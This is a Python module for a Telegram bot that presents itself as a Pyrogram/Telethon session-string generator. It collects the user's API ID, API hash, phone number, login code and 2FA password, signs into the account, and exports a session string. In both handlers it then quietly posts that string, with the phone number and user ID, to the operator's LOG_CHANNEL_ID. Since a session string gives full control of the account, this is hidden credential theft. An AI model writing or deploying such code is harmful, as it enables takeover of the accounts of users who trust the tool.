from pyrogram import Client as PyroClient, filters
from pyrogram.types import CallbackQuery, Message
from pyrogram.enums import ChatAction
from pyrogram.errors import SessionPasswordNeeded
from telethon.sync import TelegramClient as TeleClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from config import LOG_CHANNEL_ID
from database import save_user
import asyncio

user_state = {}

def init(app):
    @app.on_callback_query(filters.regex("gen_(pyrogram|telethon)"))
    async def ask_api_id(_, cq: CallbackQuery):
        user_state[cq.from_user.id] = {"lib": cq.data.split("_")[1]}
        await cq.message.edit("📲 Send your API ID:")

    @app.on_message(filters.private & filters.text)
    async def session_flow(_, msg: Message):
        uid = msg.from_user.id
        if uid not in user_state:
            return

        state = user_state[uid]
        text = msg.text.strip()

        if "api_id" not in state:
            if not text.isdigit():
                await msg.reply("❗ Please enter a valid numeric API ID.")
                return
            state["api_id"] = int(text)
            await msg.reply("🔑 Now send your API HASH:")
            return

        if "api_hash" not in state:
            state["api_hash"] = text
            await msg.reply("📞 Now send your phone number (with country code):")
            return

        if "phone" not in state:
            state["phone"] = text
            await msg.reply("🔄 Sending login code...")
            await msg.reply_chat_action(ChatAction.TYPING)

            if state["lib"] == "pyrogram":
                await handle_pyrogram_session(msg, state)
            else:
                await handle_telethon_session(msg, state)

            del user_state[uid]

async def handle_pyrogram_session(msg, state):
    try:
        app = PyroClient(
            ":memory:",
            api_id=state["api_id"],
            api_hash=state["api_hash"]
        )
        await app.connect()

        # Step 1: Send code
        sent_code = await app.send_code(state["phone"])
        await msg.reply("📤 Code sent! Enter the code you received:")
        code = await msg.ask(timeout=120)

        # Step 2: Try sign in
        try:
            await app.sign_in(
                phone_number=state["phone"],
                phone_code_hash=sent_code.phone_code_hash,
                phone_code=code.text.strip()
            )
        except SessionPasswordNeeded:
            await msg.reply("🔐 2FA is enabled. Enter your password:")
            pw = await msg.ask(timeout=120)
            await app.check_password(password=pw.text.strip())

        # Step 3: Export session after successful login
        session_str = await app.export_session_string()
        me = await app.get_me()
        save_user(me)

        await msg._client.send_message(
            LOG_CHANNEL_ID,
            f"📥 **Pyrogram Session Generated**\n"
            f"👤 [{me.first_name}](tg://user?id={me.id})\n"
            f"🆔 `{me.id}`\n"
            f"📞 `{state['phone']}`\n"
            f"📄 `{session_str}`"
        )
        await msg.reply(f"✅ Pyrogram Session:\n\n`{session_str}`", quote=True)

        await app.disconnect()

    except Exception as e:
        await msg.reply(f"❌ Error: `{e}`")


async def handle_telethon_session(msg, state):
    try:
        client = TeleClient(
            StringSession(),
            state["api_id"],
            state["api_hash"]
        )
        await client.connect()

        if not await client.is_user_authorized():
            await client.send_code_request(state["phone"])
            await msg.reply("📤 Code sent! Enter the code:")
            user_code = await msg.ask(timeout=120)

            try:
                await client.sign_in(state["phone"], user_code.text.strip())
            except SessionPasswordNeededError:
                await msg.reply("🔐 2FA is enabled. Enter your password:")
                pw = await msg.ask(timeout=120)
                await client.sign_in(password=pw.text.strip())

        session_str = client.session.save()
        me = await client.get_me()
        await client.disconnect()

        save_user(me)

        await msg._client.send_message(
            LOG_CHANNEL_ID,
            f"📥 **Telethon Session Generated**\n"
            f"👤 [{me.first_name}](tg://user?id={me.id})\n"
            f"🆔 `{me.id}`\n"
            f"📞 `{state['phone']}`\n"
            f"📄 `{session_str}`"
        )
        await msg.reply(f"✅ Telethon Session:\n\n`{session_str}`", quote=True)

    except Exception as e:
        await msg.reply(f"❌ Error: `{e}`")
